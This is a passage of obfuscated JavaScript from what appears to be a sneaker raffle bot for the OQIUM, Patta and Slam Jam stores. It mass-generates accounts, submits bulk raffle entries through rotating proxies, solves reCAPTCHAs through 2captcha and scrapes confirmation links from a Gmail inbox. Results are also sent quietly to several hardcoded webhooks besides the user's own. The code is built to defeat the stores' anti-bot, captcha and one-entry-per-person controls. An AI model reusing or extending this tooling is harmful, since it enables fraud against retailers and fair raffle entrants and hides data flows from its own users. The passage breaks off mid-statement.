                            await _0x3df0e8(_0x44352b, 'nor', _0x2cedfc, _0x595810, _0xa97e22), console['log'](_0x207f7e() + '\x20[' + _0x2cedfc['name'] + ']\x20Sleeping\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                        } catch (_0x324ad3) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4390a4, _0x43fec0, _0xd493b) {
                    var _0x43fec0 = [];
                    async function _0x82830a() {
                        var _0x57311f = new _0x91ddb5({
                            'user': _0x397a11['masterMail'],
                            'password': _0x397a11['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0xdca66f(_0x14cff6) {
                            _0x57311f['openBox']('INBOX', ![], _0x14cff6);
                        }
                        _0x57311f['once']('ready', function () {
                            _0xdca66f(function (_0x9c697c, _0x4782b2) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x9c697c)
                                    throw _0x9c697c;
                                _0x57311f['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'FROM',
                                        'customerservice@oqium.com'
                                    ]
                                ], function (_0xda246f, _0x332609) {
                                    if (!_0x332609 || !_0x332609['length'])
                                        console['log'](_0x207f7e() + '\x20[' + _0x4390a4['name'] + ']\x20No\x20mails\x20found'), _0x57311f['end']();
                                    else {
                                        var _0x4b9f19 = _0x57311f['seq']['fetch'](_0x332609, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4b9f19['on']('message', function (_0x4543ba, _0x55db01) {
                                            var _0xd9c95e = '(#' + _0x55db01 + ')\x20';
                                            _0x4543ba['on']('body', function (_0x1c05f0, _0xfdccf1) {
                                                _0x3631ef(_0x1c05f0, (_0x59e1fe, _0x4e2672) => {
                                                    if (_0x4e2672['subject'] == 'Confirm\x20Your\x20Subscription' && _0x4e2672['from']['value'][0x0]['name'] == 'OQIUM') {
                                                        var _0x379f74 = _0x4e2672['text']['split']('(')[0x1], _0x15203f = _0x379f74['split'](')')[0x0];
                                                        _0x43fec0['push'](_0x15203f);
                                                    }
                                                });
                                            }), _0x4543ba['once']('end', function () {
                                            });
                                        }), _0x4b9f19['once']('error', function (_0x16b559) {
                                            console['log']('Fetch\x20error:\x20' + _0x16b559);
                                        }), _0x4b9f19['once']('end', function () {
                                            _0x57311f['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x57311f['once']('error', function (_0x36c8cf) {
                            console['log'](_0x36c8cf);
                        }), _0x57311f['once']('end', async function () {
                        }), _0x57311f['connect']();
                    }
                    async function _0x2308b9(_0x37a3a6, _0x5939fa, _0x2fbdbc) {
                        for (var _0x22bdd5 = 0x0; _0x22bdd5 < _0x5939fa['length']; _0x22bdd5++) {
                            async function _0x24624f(_0x34e13b, _0x4aaea0, _0x5171c6, _0x1aa626, _0x554709) {
                                var _0x7ee21e, _0xa206db = {}, _0x140ec6 = [], _0x532391 = {}, _0x4c3c62 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0xfd8ee5 = Math['round'](Math['random']() * (_0x4c3c62['length'] - 0x1));
                                _0x1aa626[_0x34e13b]['Size'] == 'RANDOM' && (_0x1aa626[_0x34e13b]['Size'] = _0x4c3c62[_0xfd8ee5]);
                                !_0x1aa626 && (_0x1aa626 = {});
                                if (_0x397a11['useRandomProxy'] = ![])
                                    var _0x9f3389 = _0x554709[_0x34e13b]['split'](':');
                                else
                                    var _0x3e3885 = Math['round'](Math['random']() * (_0x554709['length'] - 0x1)), _0x9f3389 = _0x554709[_0x3e3885]['split'](':');
                                var _0x13dced = {
                                    'jar': _0x45e81e,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5171c6['url'],
                                    'headers': _0x5171c6['headers'],
                                    'body': JSON['stringify'](_0xa206db),
                                    'proxy': 'http://' + _0x9f3389[0x2] + ':' + _0x9f3389[0x3] + '@' + _0x9f3389[0x0] + ':' + _0x9f3389[0x1]
                                };
                                return _0x4aaea0 != 'ver' && (_0x13dced['url'] = _0x5171c6['url'], _0x13dced['headers'] = _0x5171c6['headers']), _0x4aaea0 == 'ver' && (_0x13dced['method'] = 'GET', _0x13dced['url'] = _0x1aa626[_0x34e13b]), new Promise(function (_0x35f17e, _0x5b4fb4) {
                                    callback = async (_0x3bf434, _0x55bce0, _0x2b3578) => {
                                        if (!_0x3bf434 && _0x55bce0['statusCode'] == 0xca || !_0x3bf434 && _0x55bce0['statusCode'] == 0xc8) {
                                            if (_0x4aaea0 != 'ver') {
                                                var _0x289ce4 = await _0x1487ea(_0x1aa626[_0x34e13b], _0x5171c6, 'dev', ![]), _0x63b040 = await _0x1487ea(_0x1aa626[_0x34e13b], _0x5171c6, 'pub', ![]);
                                                const _0x46ec7b = {
                                                    'succesDEVMSG': { 'embeds': [_0x289ce4] },
                                                    'succesPUBMSG': { 'embeds': [_0x63b040] }
                                                };
                                                if (_0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '')
                                                    try {
                                                        await _0x5e696c(_0x397a11['webhook'], _0x46ec7b['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0x46ec7b['succesDEVMSG']), await _0x2bc7d2(0xc8);
                                                try {
                                                    await _0x5e696c(_0x3ebea8, _0x46ec7b['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x1560d5(_0x1aa626[_0x34e13b], _0x5171c6);
                                            }
                                            _0x35f17e(console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x5171c6['name'] + ']\x20Task\x20' + (_0x34e13b + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x4aaea0 != 'ver') {
                                                var _0x33eaa1 = '' + _0x3bf434, _0x596d6f = await _0x1487ea(_0x1aa626[_0x34e13b], _0x5171c6, 'dev', !![], _0x33eaa1), _0x19c8c4 = {};
                                                _0x19c8c4['errorDEV'] = { 'embeds': [_0x596d6f] }, _0x4b302f(_0x1aa626[_0x34e13b], _0x5171c6), _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x19c8c4['errorDEV']), await _0x5e696c(_0x8997ff, _0x19c8c4['errorDEV']);
                                            }
                                            _0x5b4fb4(console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x5171c6['name'] + ']\x20Task\x20' + (_0x34e13b + 0x1) + ':\x20' + _0x3bf434)));
                                        }
                                    };
                                    try {
                                        _0x4aaea0 != 'ver' ? console['log'](_0x207f7e() + '\x20[' + _0x5171c6['name'] + ']\x20Task\x20' + (_0x34e13b + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xa206db['data']['attributes']['email']) : console['log'](_0x207f7e() + '\x20[' + _0x5171c6['name'] + ']\x20Task\x20' + (_0x34e13b + 0x1) + ':\x20Fetching\x20Response'), _0x5f4dd5(_0x13dced, callback);
                                    } catch (_0x192a68) {
                                        console['log'](_0x207f7e() + '\x20Task\x20' + (_0x34e13b + 0x1) + ':\x20' + _0x192a68);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x24624f(_0x22bdd5, 'ver', _0x37a3a6, _0x5939fa, _0x2fbdbc), console['log'](_0x207f7e() + '\x20[' + _0x37a3a6['name'] + ']\x20Sleeping\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                            } catch (_0x46411f) {
                            }
                        }
                    }
                    try {
                        _0x82830a(), await _0x2bc7d2(0xfa0), console['log']('Found\x20' + _0x43fec0['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x2308b9(_0x4390a4, _0x43fec0, _0xd493b);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x1ce8b1, _0x4180db, _0x50d30f) {
                    _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x397a11['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5e49bf = 0x0; _0x5e49bf < _0x4180db['length']; _0x5e49bf++) {
                        var _0x3a190b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3b1bf1
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x397a11['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x14595d
                                }
                            ]
                        }];
                        const _0x123c16 = { 'embeds': _0x3a190b };
                        _0x535b9c(_0x1ce8b1['name'] + '\x20Task\x20' + (_0x5e49bf + 0x1) + '\x20/\x20' + _0x4180db['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d), await _0x38eff1(_0x4180db, _0x5e49bf);
                        var _0x3aae9d = await _0x1487ea(_0x4180db[_0x5e49bf], _0x1ce8b1, 'acc', ![]);
                        const _0x411dc8 = { 'succesDEVMSG': { 'embeds': [_0x3aae9d] } };
                        if (_0x4180db[_0x5e49bf]['Email'] == '' || _0x4180db[_0x5e49bf]['FirstName'] == '' || _0x4180db[_0x5e49bf]['LastName'] == '') {
                            console['log'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0x5e49bf + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x2bc7d2(0x7d0);
                            continue;
                        }
                        (_0x4180db[_0x5e49bf]['Password'] == '' || _0x4180db[_0x5e49bf] == undefined) && _0x4180db[_0x5e49bf]['Password'] == 'JRaffles23!';
                        if (_0x397a11['useRandomProxy'] = ![])
                            var _0x1e2ed8 = _0x50d30f[_0x5e49bf]['split'](':');
                        else
                            var _0x2962d0 = Math['round'](Math['random']() * (_0x50d30f['length'] - 0x1)), _0x1e2ed8 = _0x50d30f[_0x2962d0]['split'](':');
                        const _0x5e86c4 = await _0x4e5975['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1e2ed8[0x0] + ':' + _0x1e2ed8[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x327c95 = await _0x5e86c4['newPage']();
                            await _0x327c95['authenticate']({
                                'username': '' + _0x1e2ed8[0x2],
                                'password': '' + _0x1e2ed8[0x3]
                            }), console['log'](_0x207f7e() + '\x20[' + _0x1ce8b1['name'] + ']\x20Task\x20' + (_0x5e49bf + 0x1) + '\x20:\x20Getting\x20Session'), await _0x327c95['setRequestInterception'](!![]), _0x327c95['on']('request', _0x94f305 => {
                                _0x94f305['resourceType']() === 'image' || _0x94f305['resourceType']() === 'font' || _0x94f305['resourceType']() === 'media' ? _0x94f305['abort']() : _0x94f305['continue']();
                            }), await _0x327c95['goto']('https://patta.nl/account/register'), await _0x2bc7d2(0xbb8), await _0x327c95['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x207f7e() + '\x20[' + _0x1ce8b1['name'] + ']\x20Task\x20' + (_0x5e49bf + 0x1) + '\x20:\x20Filling\x20information'), await _0x327c95['type']('#RegisterForm-FirstName', '' + _0x4180db[_0x5e49bf]['FirstName']), await _0x2bc7d2(0x226), await _0x327c95['type']('#RegisterForm-LastName', '' + _0x4180db[_0x5e49bf]['LastName']), await _0x2bc7d2(0x226), await _0x327c95['type']('#RegisterForm-email', '' + _0x4180db[_0x5e49bf]['Email']), await _0x2bc7d2(0x226), await _0x327c95['type']('#RegisterForm-password', '' + _0x4180db[_0x5e49bf]['Password']), await _0x2bc7d2(0x226), console['log'](_0x207f7e() + '\x20[' + _0x1ce8b1['name'] + ']\x20Task\x20' + (_0x5e49bf + 0x1) + '\x20:\x20Submitting..'), await _0x327c95['$eval']('#RegisterForm', _0x566ef5 => _0x566ef5['submit']()), await _0x2bc7d2(0x1f40);
                            try {
                                await _0x327c95['waitForSelector']('.home-page-grid__collection'), await _0x2bc7d2(0x1f4), console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x1ce8b1['name'] + ']\x20Task\x20' + (_0x5e49bf + 0x1) + '\x20:\x20Account\x20' + _0x4180db[_0x5e49bf]['Email'] + '\x20Generated!')), _0xd8dc96['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x4180db[_0x5e49bf]['Email'] + ',' + _0x4180db[_0x5e49bf]['Password']), console['log'](_0x49dcd4['yellow'](_0x207f7e() + '\x20[' + _0x1ce8b1['name'] + ']\x20Task\x20' + (_0x5e49bf + 0x1) + '\x20:\x20Account\x20' + _0x4180db[_0x5e49bf]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x411dc8['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5e696c(_0x29936e, _0x411dc8['succesDEVMSG']);
                            } catch (_0x3beaeb) {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0x5e49bf + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3beaeb));
                            }
                        } catch (_0x111bcf) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0x5e49bf + 0x1) + '\x20:\x20' + _0x111bcf));
                        } finally {
                            _0x5e86c4 && _0x5e86c4['close'](), console['log']('Waiting\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x438160, _0x509f55, _0x2dbe27) {
                    _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x397a11['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4d64b8 = 0x0; _0x4d64b8 < _0x509f55['length']; _0x4d64b8++) {
                        var _0x47416d;
                        if (_0xa41135 != 'yes')
                            var _0xa41135 = '', _0x43936e = 0x0;
                        _0x535b9c(_0x438160['name'] + '\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20/\x20' + _0x509f55['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d), await _0x38eff1(_0x509f55, _0x4d64b8);
                        if (_0x509f55[_0x4d64b8]['Email'] == '' || _0x509f55[_0x4d64b8]['Password'] == '' || _0x509f55[_0x4d64b8]['FirstName'] == '' || _0x509f55[_0x4d64b8]['LastName'] == '') {
                            console['log'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x397a11['useRandomProxy'] = ![])
                            var _0x360ddb = _0x2dbe27[_0x4d64b8]['split'](':');
                        else
                            var _0x7136d5 = Math['round'](Math['random']() * (_0x2dbe27['length'] - 0x1)), _0x360ddb = _0x2dbe27[_0x7136d5]['split'](':');
                        const _0x584faf = await _0x4e5975['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x360ddb[0x0] + ':' + _0x360ddb[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x2f9db1 = await _0x584faf['newPage']();
                            await _0x2f9db1['authenticate']({
                                'username': '' + _0x360ddb[0x2],
                                'password': '' + _0x360ddb[0x3]
                            }), console['log'](_0x207f7e() + '\x20[' + _0x438160['name'] + ']\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2f9db1['setRequestInterception'](!![]), _0x2f9db1['on']('request', _0x2846a2 => {
                                _0x2846a2['resourceType']() === 'image' || _0x2846a2['resourceType']() === 'font' || _0x2846a2['resourceType']() === 'media' ? _0x2846a2['abort']() : _0x2846a2['continue']();
                            }), await _0x2f9db1['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2f9db1['waitForSelector']('#CustomerEmail'), console['log'](_0x207f7e() + '\x20[' + _0x438160['name'] + ']\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2f9db1['type']('#CustomerEmail', '' + _0x509f55[_0x4d64b8]['Email']), await _0x2bc7d2(0x12c), await _0x2f9db1['type']('#CustomerPassword', '' + _0x509f55[_0x4d64b8]['Password']), await _0x2bc7d2(0x226), await _0x2f9db1['$eval']('#customer_login', _0x35ce43 => _0x35ce43['submit']());
                            try {
                                await _0x2f9db1['waitForSelector']('#orders'), await _0x2bc7d2(0x4b0);
                            } catch {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x438160['name'] + ']\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x2f9db1['goto']('' + _0x509f55[_0x4d64b8]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2bc7d2(0xbb8), console['log'](_0x207f7e() + '\x20[' + _0x438160['name'] + ']\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x2f9db1['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x438160['name'] + ']\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x2f9db1['type']('#email', '' + _0x509f55[_0x4d64b8]['Email']), await _0x2bc7d2(0x384), await _0x2f9db1['type']('#first_name', '' + _0x509f55[_0x4d64b8]['FirstName']), await _0x2bc7d2(0x514), await _0x2f9db1['type']('#last_name', '' + _0x509f55[_0x4d64b8]['LastName']), await _0x2bc7d2(0x514), await _0x2f9db1['type']('#street_address', _0x509f55[_0x4d64b8]['Address1'] + '\x20' + _0x509f55[_0x4d64b8]['HouseNumber'] + '\x20' + _0x509f55[_0x4d64b8]['Address2']), await _0x2bc7d2(0x2bc);
                            _0x509f55[_0x4d64b8]['Postcode'] == undefined && (_0x509f55[_0x4d64b8]['Postcode'] = _0x509f55[_0x4d64b8]['Zip']);
                            await _0x2f9db1['type']('#zip_code', '' + _0x509f55[_0x4d64b8]['Postcode']), await _0x2bc7d2(0x320), await _0x2f9db1['type']('#city', '' + _0x509f55[_0x4d64b8]['City']), await _0x2bc7d2(0x320), await _0x2f9db1['type']('#bday', '01/01/1994'), await _0x2bc7d2(0x320), await _0x2f9db1['type']('#instagram', '' + _0x509f55[_0x4d64b8]['Follower']), await _0x2bc7d2(0x352);
                            if (_0x509f55[_0x4d64b8]['Size'] == 'RANDOM') {
                                const _0x2c7cb9 = await _0x2f9db1['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x1dfa03 => {
                                    return _0x1dfa03['map'](_0x3b4980 => _0x3b4980['textContent']);
                                });
                                var _0x2d6e1d = Math['round'](Math['random']() * (_0x2c7cb9['length'] - 0x1));
                                console['log'](_0x207f7e() + '\x20[' + _0x438160['name'] + ']\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x2c7cb9[_0x2d6e1d]), await _0x2f9db1['click']('label[data-eu-size=\x22' + _0x2c7cb9[_0x2d6e1d] + '\x22]');
                            } else {
                                console['log'](_0x207f7e() + '\x20[' + _0x438160['name'] + ']\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x509f55[_0x4d64b8]['Size']);
                                try {
                                    await _0x2f9db1['click']('label[data-eu-size=\x22' + _0x509f55[_0x4d64b8]['Size'] + '\x22]');
                                } catch {
                                    await _0x2f9db1['click']('label[data-eu-size=\x22' + _0x509f55[_0x4d64b8]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x2bc7d2(0xbb8), await _0x2f9db1['$$eval']('.raffle__checkbox-label', _0x25faa2 => _0x25faa2['forEach'](_0x30e706 => _0x30e706['click']())), await _0x2bc7d2(0x7d0), console['log'](_0x207f7e() + '\x20[' + _0x438160['name'] + ']\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x2f9db1['click']('#raffle__form-submit'), await _0x2bc7d2(0x1388);
                            try {
                                await _0x2f9db1['waitForSelector']('#raffle__confirmation-message-container'), _0xa41135 = 'no', _0x1560d5(_0x509f55[_0x4d64b8], _0x438160), console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x438160['name'] + ']\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x1ff45e) {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x1ff45e));
                            }
                        } catch (_0x4067f9) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20:\x20' + _0x4067f9)), _0xa41135 = 'yes';
                        } finally {
                            _0x584faf && _0x584faf['close']();
                            if (_0xa41135 == 'yes' && _0x43936e != 0x5 && _0x47416d != 'Size\x20Not\x20Found') {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x438160['name'] + ']\x20Task\x20' + (_0x4d64b8 + 0x1) + '\x20:\x20Retrying')), _0x4d64b8 = _0x4d64b8 - 0x1, _0x43936e = _0x43936e + 0x1;
                                continue;
                            }
                            _0xa41135 == 'yes' && _0x43936e >= 0x5 && (_0x4b302f(_0x509f55[_0x4d64b8], _0x438160), _0xa41135 = 'no', _0x43936e = 0x0), console['log']('Waiting\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x5e6003, _0x5e7b19, _0x4443f8) {
                    _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x397a11['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x17339c = 0x0; _0x17339c < _0x5e7b19['length']; _0x17339c++) {
                        if (_0x150a99 != 'yes')
                            var _0x150a99 = '', _0x336152 = 0x0;
                        var _0xc5d07f = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3b1bf1
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x397a11['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x14595d
                                }
                            ]
                        }];
                        const _0x424a38 = { 'embeds': _0xc5d07f };
                        _0x535b9c(_0x5e6003['name'] + '\x20Task\x20' + (_0x17339c + 0x1) + '\x20/\x20' + _0x5e7b19['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d), await _0x38eff1(_0x5e7b19, _0x17339c);
                        var _0x191cfc = await _0x1487ea(_0x5e7b19[_0x17339c], _0x5e6003, 'acc', ![]);
                        const _0xd06c6c = { 'succesDEVMSG': { 'embeds': [_0x191cfc] } };
                        if (_0x5e7b19[_0x17339c]['Email'] == '' || _0x5e7b19[_0x17339c]['FirstName'] == '' || _0x5e7b19[_0x17339c]['LastName'] == '') {
                            console['log'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0x17339c + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x2bc7d2(0x7d0);
                            continue;
                        }
                        (_0x5e7b19[_0x17339c]['Password'] == '' || _0x5e7b19[_0x17339c] == undefined) && _0x5e7b19[_0x17339c]['Password'] == 'JRaffles23!';
                        if (_0x397a11['useRandomProxy'] = ![])
                            var _0x303aa5 = _0x4443f8[_0x17339c]['split'](':');
                        else
                            var _0x1b7dae = Math['round'](Math['random']() * (_0x4443f8['length'] - 0x1)), _0x303aa5 = _0x4443f8[_0x1b7dae]['split'](':');
                        const _0x1fc7fb = await _0x4e5975['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x303aa5[0x0] + ':' + _0x303aa5[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x450862 = await _0x1fc7fb['newPage']();
                            await _0x450862['authenticate']({
                                'username': '' + _0x303aa5[0x2],
                                'password': '' + _0x303aa5[0x3]
                            }), console['log'](_0x207f7e() + '\x20[' + _0x5e6003['name'] + ']\x20Task\x20' + (_0x17339c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x450862['setRequestInterception'](!![]), _0x450862['on']('request', _0x16f7ad => {
                                _0x16f7ad['resourceType']() === 'image' || _0x16f7ad['resourceType']() === 'font' || _0x16f7ad['resourceType']() === 'media' ? _0x16f7ad['abort']() : _0x16f7ad['continue']();
                            }), await _0x450862['goto']('https://drop.slamjam.com/account/register'), await _0x2bc7d2(0xbb8), await _0x450862['waitForSelector']('#FirstName'), await _0x450862['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x450862['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x207f7e() + '\x20[' + _0x5e6003['name'] + ']\x20Task\x20' + (_0x17339c + 0x1) + '\x20:\x20Filling\x20information'), await _0x2bc7d2(0x4b0), await _0x450862['type']('#FirstName', '' + _0x5e7b19[_0x17339c]['FirstName']), await _0x2bc7d2(0x226), await _0x450862['type']('#LastName', '' + _0x5e7b19[_0x17339c]['LastName']), await _0x2bc7d2(0x226), await _0x450862['type']('#Email', '' + _0x5e7b19[_0x17339c]['Email']), await _0x2bc7d2(0x2ee), await _0x450862['type']('#ConfirmEmail', '' + _0x5e7b19[_0x17339c]['Email']), await _0x2bc7d2(0x2ee), await _0x450862['type']('#CreatePassword', '' + _0x5e7b19[_0x17339c]['Password']), await _0x2bc7d2(0x2ee), await _0x450862['type']('#CreateConfirmPassword', '' + _0x5e7b19[_0x17339c]['Password']), await _0x2bc7d2(0x226), console['log'](_0x207f7e() + '\x20[' + _0x5e6003['name'] + ']\x20Task\x20' + (_0x17339c + 0x1) + '\x20:\x20Submitting..'), await _0x450862['$eval']('#create_customer', _0x1789e6 => _0x1789e6['submit']()), await _0x2bc7d2(0x1388), console['log'](_0x207f7e() + '\x20[' + _0x5e6003['name'] + ']\x20Task\x20' + (_0x17339c + 0x1) + '\x20:\x20' + _0x49dcd4['cyan']('Solving\x20Captcha')), await _0x450862['solveRecaptchas'](), console['log'](_0x207f7e() + '\x20[' + _0x5e6003['name'] + ']\x20Task\x20' 